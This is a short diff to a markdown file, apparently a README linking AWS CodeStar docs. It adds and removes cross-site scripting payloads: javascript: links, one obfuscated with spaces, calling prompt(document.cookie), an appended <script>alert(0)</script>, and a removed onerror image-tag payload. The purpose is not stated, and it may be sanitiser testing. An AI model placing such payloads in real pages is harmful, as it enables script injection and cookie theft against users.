@@ -76,12 +76,10 @@ Best Practices: https://docs.aws.amazon.com/codestar/latest/userguide/best-pract
 
 
 
-[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie)) <script>alert(0)</script>
 
 
 
-![a">
-<'"`onerror=prompt(document.cookie](javascript:prompt(document.cookie))\
 
 
 [a](javascript:prompt(document.cookie))
